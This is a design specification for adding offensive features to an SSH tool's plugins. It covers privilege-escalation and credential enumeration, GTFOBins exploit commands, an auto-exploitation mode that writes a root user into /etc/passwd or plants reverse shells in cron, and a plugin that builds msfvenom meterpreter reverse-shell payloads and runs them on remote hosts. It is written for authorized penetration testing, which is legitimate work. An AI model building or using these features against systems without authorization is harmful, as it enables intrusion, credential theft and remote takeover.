# Product Requirements Document: Plugin System Enhancements

## Overview

Enhance the LazySSH plugin system with two major initiatives:
1. **Enumeration plugin overhaul** - Expand from basic system survey to comprehensive linpeas-class privilege escalation and vulnerability discovery with automated exploitation capabilities
2. **Upload-and-Execute plugin** - New built-in plugin to upload and execute arbitrary binaries on remote hosts, with optional msfvenom payload generation

## Context

### Current State

**Enumeration plugin (v2.0.0):**
- 68 remote probes across 11 categories
- 8 priority heuristics (3 high, 3 medium, 1 info severity + kernel drift)
- Single batched script execution over SSH control socket with JSON output
- Rich UI rendering with plain-text and JSON export

**Plugin system:**
- Discovery from 4 search paths (env, user, runtime, packaged)
- Metadata via comment headers (PLUGIN_NAME, PLUGIN_DESCRIPTION, etc.)
- Environment variable injection for connection context (LAZYSSH_SOCKET_PATH, LAZYSSH_HOST, etc.)
- 5-minute execution timeout with streaming support
- Python and shell plugin support

### What's Missing (vs. linpeas/PEASS-ng)

The current enumerate plugin is a **system survey** tool. It collects data and flags a few obvious findings. It lacks:

**Privilege escalation vectors not currently checked:**
- Capabilities on binaries (`getcap`)
- Writable files in PATH directories
- Writable /etc/passwd or /etc/shadow
- Docker/LXC container escape checks (docker group membership, socket access)
- Writable systemd service/timer files
- Writable cron files (not just listing them)
- NFS shares with no_root_squash
- Misconfigured polkit rules
- Writable .service files or .timer files owned by root
- doas.conf checks (alternative to sudo)
- pkexec vulnerabilities
- LD_PRELOAD / LD_LIBRARY_PATH hijacking opportunities
- Unquoted service paths (less relevant on Linux but still a check)
- GTFOBins cross-referencing for SUID/sudo binaries
- Kernel exploit suggester (based on kernel version)
- Readable SSH keys in common locations
- Credentials in config files, history files, environment variables
- Password hashes accessible in /etc/shadow
- Database credentials in common locations
- AWS/GCP/Azure metadata endpoints and credential files
- Interesting files in /opt, /var/backups, /var/mail
- Writable log files that could be used for log poisoning
- Python/Perl/Ruby library hijacking
- PATH injection opportunities

**Automated exploitation capabilities not present:**
- No auto-exploitation of discovered vulnerabilities
- No capability to attempt privilege escalation based on findings
- No GTFOBins-based automatic shell generation
- No writable cron/service exploitation

---

## Requirements

### REQ-1: Enumeration Plugin Expansion

**Goal:** Transform the enumerate plugin into a comprehensive privilege escalation scanner that rivals linpeas in coverage, with the added capability of automated exploitation.

#### REQ-1.1: New Probe Categories

Add the following probe categories to `_enumeration_plan.py`:

**Capabilities (new category):**
- `cap_binaries` - Find binaries with capabilities (`getcap -r / 2>/dev/null`)
- `cap_interesting` - Filter for dangerous capabilities (cap_setuid, cap_setgid, cap_dac_override, cap_sys_admin, cap_sys_ptrace, cap_net_raw, cap_net_bind_service, cap_chown, cap_fowner)

**Container Escape (new category):**
- `docker_group` - Check if user is in docker group
- `docker_socket` - Check for accessible Docker socket (`/var/run/docker.sock`)
- `container_detection` - Detect if running inside a container (cgroups, `.dockerenv`, etc.)
- `lxc_check` - LXC/LXD container checks

**Credential Discovery (new category):**
- `shadow_readable` - Check if `/etc/shadow` is readable
- `ssh_keys` - Find readable SSH private keys in common locations
- `history_files` - Check bash/zsh/python history for credentials
- `config_credentials` - Search common config files for passwords/tokens (`.env`, database configs, web configs)
- `cloud_credentials` - Check for AWS/GCP/Azure credential files and metadata endpoints
- `git_credentials` - `.git-credentials`, `.gitconfig` with credentials
- `password_files` - Files with "password", "passwd", "credential" in name
- `database_configs` - MySQL `.my.cnf`, PostgreSQL `.pgpass`, MongoDB configs
- `wifi_credentials` - NetworkManager saved connections

**Writable Files (new category):**
- `writable_passwd` - Check if `/etc/passwd` is writable
- `writable_shadow` - Check if `/etc/shadow` is writable
- `writable_sudoers` - Check if sudoers files are writable
- `writable_cron` - Check if system cron files/dirs are writable
- `writable_services` - Check if systemd service files are writable
- `writable_path_dirs` - Check if any directories in PATH are writable
- `writable_profile` - Check writable shell profile files (`/etc/profile`, `/etc/bash.bashrc`, etc.)
- `writable_init_scripts` - Check writable init.d scripts

**Library Hijacking (new category):**
- `ld_preload` - Check LD_PRELOAD and `/etc/ld.so.preload`
- `ld_library_path` - Check LD_LIBRARY_PATH for hijacking opportunities
- `python_path` - Check PYTHONPATH and writable Python lib directories
- `rpath_runpath` - Check binaries for writable RPATH/RUNPATH entries

**NFS/Mounts (expand filesystem):**
- `nfs_shares` - Check `/etc/exports` for no_root_squash
- `mounted_nfs` - List NFS mounts and their options

**Interesting Files (new category):**
- `backup_files` - Check `/var/backups`, common backup locations
- `mail_files` - Check `/var/mail`, `/var/spool/mail`
- `opt_contents` - List `/opt` directory contents
- `tmp_interesting` - Find scripts/executables in temp directories
- `recently_modified` - Files modified in last 24h/7d in sensitive locations

**Alternative Auth (expand users):**
- `doas_conf` - Check for doas.conf and its permissions
- `polkit_rules` - Check for misconfigured polkit rules
- `pkexec_version` - Check pkexec version for known vulnerabilities

#### REQ-1.2: New Heuristics

Add these priority finding heuristics:

**HIGH severity:**
- `dangerous_capabilities` - Flag binaries with dangerous capabilities (cap_setuid, cap_sys_admin, etc.)
- `writable_passwd` - Flag if /etc/passwd is writable (instant root)
- `docker_escape` - Flag if user is in docker group or socket is accessible
- `writable_service_files` - Flag writable systemd services run as root
- `credential_exposure` - Flag readable SSH keys, shadow, credential files
- `gtfobins_sudo` - Cross-reference sudo-allowed binaries against GTFOBins database
- `gtfobins_suid` - Cross-reference SUID binaries against GTFOBins database

**MEDIUM severity:**
- `writable_path` - Flag writable directories in PATH
- `writable_cron_files` - Flag writable cron files/directories
- `nfs_no_root_squash` - Flag NFS shares with no_root_squash
- `ld_preload_hijack` - Flag LD_PRELOAD/library hijacking opportunities
- `container_detected` - Flag container environment (affects exploit strategy)

**INFO severity:**
- `cloud_environment` - Flag cloud metadata/credentials available
- `interesting_backups` - Flag accessible backup files
- `recent_modifications` - Flag recently modified sensitive files

#### REQ-1.3: GTFOBins Integration

Embed a curated subset of the GTFOBins database within the plugin (as a Python data structure, not requiring network access). This should include:

- Binary name to capability mapping (shell, file-read, file-write, suid, sudo, capabilities)
- For each exploitable binary+context combination, store a command template
- Cross-reference discovered SUID binaries and sudo-allowed commands against this database
- Generate ready-to-execute exploitation commands in findings

The GTFOBins data should cover at minimum the top ~100 most common exploitable binaries (e.g., `vim`, `find`, `python`, `perl`, `awk`, `less`, `nmap`, `env`, `bash`, `tar`, `zip`, `gcc`, `docker`, `node`, etc.).

#### REQ-1.4: Kernel Exploit Suggester

Add a curated database of kernel exploits mapped to version ranges:

- Store kernel version range to CVE/exploit mappings
- Compare running kernel version against known vulnerable ranges
- Suggest relevant exploits with references (CVE ID, exploit-db links)
- Cover major exploits: DirtyPipe, DirtyCOW, PwnKit, overlayfs, etc.

#### REQ-1.5: Automated Exploitation Engine

Add an optional `--autopwn` flag (or interactive prompt) that attempts to automatically exploit discovered vulnerabilities:

**Writable /etc/passwd exploitation:**
- Generate a password hash
- Append a root-equivalent user to /etc/passwd
- Verify exploitation success

**GTFOBins SUID exploitation:**
- For discovered SUID binaries matching GTFOBins entries
- Present the user with exploitation options
- Execute the chosen exploit command

**GTFOBins sudo exploitation:**
- For sudo-allowed commands matching GTFOBins entries
- Generate and present exploit commands
- Execute with user confirmation

**Docker escape:**
- If docker group or socket detected
- Mount host filesystem via docker container
- Execute commands as root on host

**Writable cron exploitation:**
- If writable cron files detected
- Inject a reverse shell or command
- Wait for execution

**Writable service exploitation:**
- If writable systemd service files detected
- Modify service to execute payload
- Restart or wait for service restart

**Safety requirements for autopwn:**
- Always require explicit user confirmation before each exploit attempt
- Log all exploitation attempts and results
- Provide a dry-run mode (`--autopwn --dry-run`) that shows what would be attempted without executing
- Display clear warnings about potential system impact
- Roll back changes on failure where possible (e.g., restore original /etc/passwd)

#### REQ-1.6: Output Enhancements

- Group findings by exploitation difficulty (instant, easy, moderate, requires patience)
- Color-code by actionability: red = exploitable now, orange = needs more info, yellow = potential
- Add a "Quick Wins" summary section at the top showing the fastest path to root
- Include copy-pasteable exploit commands in findings
- Add `--autopwn` flag description to help output

---

### REQ-2: Upload-and-Execute Plugin

**Goal:** New built-in plugin that uploads a binary to a remote host and executes it, with optional msfvenom payload generation.

#### REQ-2.1: Core Upload and Execute

The plugin should:
1. Accept a local file path as argument (or via interactive prompt)
2. Upload the file to the remote host via SCP over the control socket
3. Make the file executable (`chmod +x`)
4. Execute the file on the remote host
5. Stream stdout/stderr back in real-time
6. Clean up the uploaded file after execution (configurable)

**Upload location:** `/tmp/.lazyssh_exec/` on the remote host (created with `0700` permissions). The directory and files should be cleaned up after execution unless `--no-cleanup` is specified.

**Arguments/flags:**
- `<file_path>` - Local file to upload and execute (positional, or prompted)
- `--args <args>` - Arguments to pass to the binary on remote
- `--no-cleanup` - Don't delete the file after execution
- `--background` - Execute in background on remote (nohup)
- `--timeout <seconds>` - Override default execution timeout
- `--output-file <path>` - Save remote output to local file

#### REQ-2.2: Architecture Detection

Before uploading, the plugin should:
1. Detect remote architecture via `uname -m`
2. Detect remote OS via `uname -s`
3. Validate that the binary is compatible with the remote system (ELF header check if applicable)
4. Display remote system info to the user

Architecture mapping:
- `x86_64` / `amd64` -> linux/x64
- `i686` / `i386` -> linux/x86
- `aarch64` / `arm64` -> linux/aarch64
- `armv7l` / `armv6l` -> linux/armle
- `mips` / `mipsel` -> linux/mips, linux/mipsel
- `ppc64le` -> linux/ppc64le

#### REQ-2.3: Msfvenom Payload Generation

When the `--msfvenom` flag is used (or no file is specified and user chooses to generate):

1. Check if `msfvenom` is available locally
2. Prompt user for payload type or auto-select based on remote architecture:
   - Default: `linux/x64/meterpreter/reverse_tcp` (or arch-appropriate variant)
   - Common options: `reverse_tcp`, `reverse_https`, `bind_tcp`, `shell_reverse_tcp`
3. Prompt for LHOST and LPORT (with intelligent defaults):
   - LHOST: Auto-detect local IP that can reach the remote host (examine routing)
   - LPORT: Default 4444
4. Generate the payload with msfvenom:
   ```
   msfvenom -p <payload> LHOST=<lhost> LPORT=<lport> -f elf -o /tmp/lazyssh_payload
   ```
5. Upload and execute the generated payload
6. Optionally display the matching handler command for msfconsole:
   ```
   use exploit/multi/handler
   set payload <payload>
   set LHOST <lhost>
   set LPORT <lport>
   run
   ```

**Payload presets by architecture:**

| Architecture | Default Payload |
|---|---|
| x86_64 | `linux/x64/meterpreter/reverse_tcp` |
| i686 | `linux/x86/meterpreter/reverse_tcp` |
| aarch64 | `linux/aarch64/meterpreter/reverse_tcp` |
| armv7l | `linux/armle/meterpreter/reverse_tcp` |

**Additional msfvenom options:**
- `--encoder <encoder>` - Use specific encoder (e.g., `x86/shikata_ga_nai`)
- `--iterations <n>` - Encoder iterations
- `--payload <payload>` - Override auto-selected payload
- `--format <format>` - Output format (default: `elf`, options: `elf`, `raw`, `py`, `sh`)

#### REQ-2.4: Interactive Mode

When run without arguments, the plugin should present an interactive menu:

```
Upload & Execute Plugin
=======================
Remote: ubuntu@192.168.1.100 (x86_64, Linux)

Options:
  1. Upload and execute a local binary
  2. Generate msfvenom payload and execute
  3. Upload only (no execution)

Choice:
```

For msfvenom option, walk through payload selection interactively:
```
Architecture detected: x86_64

Payload type:
  1. Meterpreter reverse TCP (recommended)
  2. Meterpreter reverse HTTPS
  3. Shell reverse TCP
  4. Bind TCP shell
  5. Custom payload

LHOST [auto-detected: 10.0.0.5]:
LPORT [4444]:

Generating payload... done.
Uploading... done.
Executing...
```

#### REQ-2.5: Safety and Logging

- Log all uploads and executions to the connection log directory
- Display clear warnings before execution
- Support `--dry-run` to show what would happen without executing
- Clean up generated msfvenom payloads from local temp after upload

---

### REQ-3: Plugin System Integration

#### REQ-3.1: Command Mode Updates

- Update `plugin run` help text to include new plugin
- Tab completion should include `upload-exec` (or chosen plugin name)
- Document the new `--autopwn` flag for enumerate in help

#### REQ-3.2: Plugin API Version

- Maintain `LAZYSSH_PLUGIN_API_VERSION=1` compatibility
- The new plugin should use the same environment variable contract
- Add `LAZYSSH_CONNECTION_DIR` env var to expose the connection workspace directory to plugins (for staging uploads)

#### REQ-3.3: Testing

- All new code must have unit tests following existing patterns
- Mock all subprocess/SSH calls per CLAUDE.md test isolation requirements
- Test the GTFOBins data structure for correctness
- Test heuristic evaluators with synthetic probe data
- Test msfvenom command construction (without executing)
- Test architecture detection mapping
- Achieve test coverage parity with existing plugin tests

---

## Scope and Boundaries

### In Scope
- Enumeration probe expansion (new probes, new categories)
- New heuristic evaluators
- GTFOBins data embedding and cross-referencing
- Kernel exploit suggester (data + matching logic)
- Autopwn framework with confirmation-gated exploitation
- Upload-and-execute plugin with msfvenom integration
- Unit tests for all new functionality
- CHANGELOG entries

### Out of Scope
- Windows target support (Linux-only for enumeration)
- Custom exploit development (only use known techniques)
- Persistent backdoor installation
- Network pivoting automation
- Plugin marketplace / distribution system
- Changes to plugin_manager.py core execution engine (use existing API)

---

## Success Criteria

1. Enumerate plugin discovers and reports on all major linpeas-equivalent privesc vectors
2. GTFOBins cross-referencing produces actionable exploit commands for discovered SUID/sudo binaries
3. Autopwn mode can exploit at least: writable /etc/passwd, GTFOBins SUID, GTFOBins sudo, docker escape
4. Upload-and-execute plugin successfully uploads, executes, and cleans up binaries
5. Msfvenom integration generates architecture-appropriate payloads and displays handler setup
6. All tests pass with proper mocking and no external dependencies
7. `make check` passes (ruff + mypy)

---

## Authorization Context

This tool is designed for **authorized penetration testing engagements** and **security assessments**. The enumeration and exploitation features are standard capabilities found in established security tools (linpeas, msfvenom, GTFOBins). Users are expected to have proper authorization before using these features against any target system.
